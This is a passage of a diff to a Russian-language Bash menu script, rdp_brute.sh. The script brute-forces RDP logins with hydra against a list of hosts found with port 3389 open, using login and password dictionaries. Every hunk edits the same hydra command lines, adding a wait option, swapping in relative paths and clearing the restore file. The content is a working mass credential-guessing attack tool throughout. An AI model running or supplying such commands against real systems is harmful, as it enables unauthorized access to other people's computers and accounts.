-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5240,6 +5516,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5251,7 +5531,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5261,7 +5541,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5271,7 +5551,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5280,7 +5560,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5309,6 +5589,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5320,7 +5604,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5330,7 +5614,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5340,7 +5624,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5349,7 +5633,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5378,6 +5662,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5389,7 +5677,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5399,7 +5687,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5409,7 +5697,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5418,7 +5706,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5447,6 +5735,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5458,7 +5750,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5468,7 +5760,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5478,7 +5770,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5487,7 +5779,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5516,6 +5808,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5527,7 +5823,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5537,7 +5833,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5547,7 +5843,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5556,7 +5852,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5585,6 +5881,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5596,7 +5896,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5606,7 +5906,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5616,7 +5916,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5625,7 +5925,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5654,6 +5954,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5665,7 +5969,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5675,7 +5979,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5685,7 +5989,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5694,7 +5998,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5723,6 +6027,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5734,7 +6042,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5744,7 +6052,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5754,7 +6062,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5763,7 +6071,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5792,6 +6100,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5803,7 +6115,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5813,7 +6125,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5823,7 +6135,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5832,7 +6144,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5861,6 +6173,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5872,7 +6188,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5882,7 +6198,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5892,7 +6208,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5901,7 +6217,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5929,6 +6245,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -5940,7 +6260,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5950,7 +6270,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5960,7 +6280,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5969,7 +6289,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -5997,6 +6317,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -6008,7 +6332,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6018,7 +6342,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6028,7 +6352,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -6037,7 +6361,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
